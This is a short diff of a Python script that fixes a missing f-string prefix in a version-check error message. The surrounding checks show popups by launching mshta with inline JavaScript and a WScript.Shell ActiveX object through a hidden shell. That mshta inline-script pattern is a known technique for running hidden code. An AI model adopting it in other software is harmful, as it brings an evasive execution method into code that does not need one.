@@ -341,7 +341,7 @@ if __name__ == "__main__":
 			os._exit(1)
 		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
 		if not (parse_version(version) > parse_version("3.9")):
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.9+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.9+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			os._exit(1)
 		if "windowsapps" in sys.executable.lower():
 			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Looks like you installed Python from Windows Store instead of using the website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
